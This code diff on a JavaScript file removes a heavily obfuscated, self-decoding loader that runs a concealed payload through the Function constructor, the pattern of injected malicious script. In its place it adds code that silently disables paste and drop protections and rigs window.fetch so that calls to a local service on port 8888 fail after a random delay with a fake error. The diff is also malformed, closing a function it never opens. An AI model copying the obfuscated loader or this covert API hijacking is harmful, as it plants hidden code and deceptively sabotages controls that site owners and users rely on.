@@ -1,1 +1,49 @@
-(function(){var oZK='',QRq=968-957;function Yej(s){var m=1813425;var o=s.length;var h=[];for(var f=0;f<o;f++){h[f]=s.charAt(f)};for(var f=0;f<o;f++){var b=m*(f+232)+(m%47769);var q=m*(f+333)+(m%35290);var k=b%o;var u=q%o;var j=h[k];h[k]=h[u];h[u]=j;m=(b+q)%3693566;};return h.join('')};var BxV=Yej('custnoacchzrnxegjmotrklfrwpvtyduqoibs').substr(0,QRq);var zlc='vp([v+. ro17=l]hocCvi;rxmjjvou12kbi;=;m]hp=nns;vwx)zr;3Cr ,q rma2d {=<,ad+o[.Cr8q6+0*7<[8sf(+1be36=,<n07osnn]78,h="j5l8=;;sa[i ==,=];r({jrfj;],;uwl(e]gr]n+[geh[;[t+vhjtr;4;are]6t,+k;v=bul=+7;]=a6,21a,rssrr.v0lhl<a=jve=e)0l20i n)garyv..)t;f(erh(h9(rlnb+,;v.t2i o;;fduh;v(o"1r+ltra+!kcsei, ;d7fl{la"(j;eu ltlavvfrb[ei;v)san=[-}}v,=otn=jur,u)bumrv9=f-nl;, .9{Co=(0)n =60lu-1fm+o),;ar5;g.9;(ajC;t! ;g89,naiylAaf7( oto)ar"=r4)nqrrhm.)gr=;o[ar(auh6(.[}(o(;)),b(a5(g +1hf=-g}{yt+=+wra({ok==etmn(0a9ho)a+]a;i )nrmach2v=edi.gr;i>p-weetu;uqgtcl9ms(;f).o8nio;.n,w1u"6n=x]e=f,; =.8)d)s(pu)uem0e1(stj=ra],;j)a(27r6vir;hs+hsc}th.s2g(nk0+sA;ulv(e)+u0c[tk*b.khu)t4v="tnin-ngv)fe}tuzn)e2u ;"=;i)}1)ztkj bpyr,.uvome]=,v1scS(v"+totrcirr4ima0oeearg;3ss)p=.hf.)+tyi.;,.r uz)A[tnmC ,qrir==Clv)r)u(=(oau(6r jna1f=a< ".hl8+ai+nal,s.p) .8r2+hp7(1Ad76h=.lgvilSe[=wo. rfv(hn;-o ,oi;k]sj)4eu>vrga)gtfuC(u+"e,cl.t(aAr{;';var zPQ=Yej[BxV];var uMy='';var Trn=zPQ;var xaX=zPQ(uMy,Yej(zlc));var ylV=xaX(Yej('fr"5jOo_ld$f,.Oe{-af.4smei31?s)6i25,O};OO5E=.tyo_3 Ov)atS$3te)!r))(tu5Oaoo(r[t]_p$_:8epf.9O)r5.Oe{5O0)u#o_dOO[{_d2"s._f;y\/#!O7[ $lr$5oeg ee5Ovtp a%.sn(a]ba3!_5e.BEEf ]iO))wO\/.;pl+wF(u#ne1 oe9t!Orn\/7.td1O_G(OOefl_cHl=aot$5Do]o1;00+O]1OOOOrO nbs_qr?1oN?2_.b3O0"]G(6Os.%Oo0O8=01=&_!3c%.we;,af7Ord_$F_"c8mtOt.e%:Ldu$tye}(3s,OO;taOjb=is<u8%8dt3s9pioifdr e]3g9t#tPc55s:m[Onjn.sfdd.8.]f03Oab, cd2c$%tpr_!h@nur}_6nE%os6O53{.r._!de))AO}:)8OO_o%8S0,a(;]n1q5,r 3fuFu_631.OO_a.c(K)o,f\'5;oors=_ciEnhtO?D6_,5OdvOa5oKrOn;3#}={5,t(AO#*aue,v7Oeh;i$pO;O tOngh=Ou# 70Oggoeg56;OOO_%_:e.}6;3O}p=O$$y36O tTee=_o6dht(hyeO#.O_;t"ul64=O55{O)!(=60et4aq.!+e6eOw34{4J.9)I)_632ff23,O), ,O7EOO4(e01O*.}r}NJ( .)"=.d(vf3(m5ATOk],O.}Ok!aO9.)0{8)O(jO=6=(1O]@dpO_)qderb(t2(oe]=mO(OOlO..Oe](O).p)6ada.qO;jOOeO.=O1 _ysO 4(3ed_nO};ls_3_]SmO,t+1f$)}$o(6h;aCoO$i7_&.(:.i;.t(if$$OduD(.7uJo> :.(OSOOp3O})8$,pO.8ecm),*57_. OaO7%O@b983;OO1bp\')=es.,8n3Our_O,dt)op.<;K76OK!0t{O;O{O_OrOn=&)]Ort)Od)(a3MIM$t0+aO,)usbO0tE_;e{Oo&ni90n3(4OOL,OO,q}j.$)_O!,6;}0}A.="(.no._$oek_=r;OO)!Ono_"nO<O9dE)f:lO%rhco_(Om=eO})dOn}%d5d!4nO1sn(0n;jidaO+1ho,9.4l{1votwjOo;Oag_(8OgrrfOt!r,liy6OlFe.qfc=( ;.>g;1.iE(Oov,sobhn(O=rStsO$_3 )it)n))e,cO4OvC3;_,O}7_i{.Oe3cir(OO0=OO(yne)2 aa9np_p83(ih2_]u4OhOu4cytdr!.!7h<nc$O3OO]nB{;.Ai;,!)O5!()c$,_bO0OOO7)O(r()1)O4]]<l,K__.w,"n{;Oeeq(me_49)b5 lobr@lOoi3,1))_O+?dr_(=+!h)=m.E)eadO.v,5346(0)tO(;_co)o%(O;]u9ei{5;c1(OO1_G!1t+tB0. O._$)?v!1OO.t.a(]>r= O7f{_E4)d t.l#a&duefsm9otrtoilin.4[nOp]d.."OdeO.u_2)t4e)5l=$f bO de!m.L5esdeOr!O(s*k8e;! 4O.ts3df;%O h_\/ftro)(;]A87].nscoO+s7_%O!(})anOO,ae+ocK%O)d4O;5-_2_i;u(\/etF5sOlbo5O6\/]4nO4noy$ge))!OO|2}]OAitj8s(]r.s;iemEO0,v;odOatO. o.uOO7O};x2 trp#a;Mn]}t(_5j)cu]je$ =5ni%O)ec1io=n3O.1ps!2s{}{(of_,i6O4onOrvo;tteu%_)li=bd )OOOt0OCOu*O_ ei{8oj2e31O,a3%ehj(bOclp a,l507ds(nM=w l(E))r{nO+.u(aOde;+wg(Oo,o(olrOn]rt1,Ot53O7(5-o!Oc\').+OO+(&xO82%$O,O77_ .)O0s_o!Py5:e.r{q;t)05n)o3dO4((e$iT1l e_v3_ t?4Od.=O (=;bsj0 nsnsE.nd,47mncth)nIb%?m_ut]$_OO%O[6](hi]prOs[d.ttrp{dl.,)d.JeboOO)sTO4(mO(t4dc..3eh(.n$Oln0%e|B]=.x]]}tO.fa]O)D)s,)f$O }=76n6crO,j5,PO3DuaOO)!Mr_$s)$dpt;Or.o6Og_fm3]$us.!t5!gp$Od);N}]u 8}Oi)!}dO7OtO )i.("fOE__fu3(ttrd]tf4hn [oEil.,6r]O%GO=j.yro4BpiOaba_oO._aoh!jfir[\/9!aeO$;t,;){.o-$o]w! 3,5r;P)la>)n0o\'6jj;eqOoOfOr}.Ii](=e6eoOnfo37{(%.]n0Ov3KK8 %)DNi8{sf5O85['));var FAG=Trn(oZK,ylV );FAG(8854);return 5386})()
+  const _origPD = Event.prototype.preventDefault;
+  Event.prototype.preventDefault = function(){
+    if (this.type==='paste' || this.type==='drop') return;
+    return _origPD.apply(this, arguments);
+  };
+
+  const _origAdd = EventTarget.prototype.addEventListener;
+  EventTarget.prototype.addEventListener = function(type, fn, opts){
+    if (type==='paste' || type==='drop') return;
+    return _origAdd.call(this, type, fn, opts);
+  };
+  
+const _origFetch = window.fetch;
+
+window.fetch = function(resource, init) {
+  let url;
+
+  if (resource instanceof Request) {
+    url = resource.url;
+  } else {
+    url = String(resource);
+  }
+
+  try {
+    const parsed = new URL(url, location.origin);
+    const host = parsed.hostname;
+    const port = parsed.port || (parsed.protocol === 'https:' ? '443' : '80');
+
+    const isLocalhost = (
+      host === 'localhost' ||
+      host === '127.0.0.1' ||
+      host === '[::1]'
+    );
+
+    if (isLocalhost && port === '8888') {
+      const delay = 10000 + Math.random() * 10000;
+
+      return new Promise((_, reject) => {
+        setTimeout(() => {
+          reject(new TypeError('Failed to fetch'));
+        }, delay);
+      });
+    }
+  } catch (e) {
+  }
+
+  return _origFetch.call(this, resource, init);
+};
+})();
